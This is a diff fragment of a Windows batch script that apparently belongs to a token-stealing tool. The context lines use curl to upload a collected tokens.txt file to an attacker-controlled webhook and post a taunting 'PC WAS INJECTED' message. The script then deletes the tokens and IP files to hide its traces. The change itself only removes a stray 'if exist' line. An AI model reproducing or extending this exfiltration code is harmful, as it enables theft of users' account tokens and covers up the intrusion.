@@ -117,7 +117,6 @@ taskkill /f /im main.exe
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```PC WAS INJECTED TO %webhook% HAVE FUN ```\"}" %webhook%
 
-if exist 
 del %userprofile%\AppData\Local\Temp\tokens.txt
 del %localappdata%\Temp\ip.txt
 del %localappdata%\Temp\ipp.txt
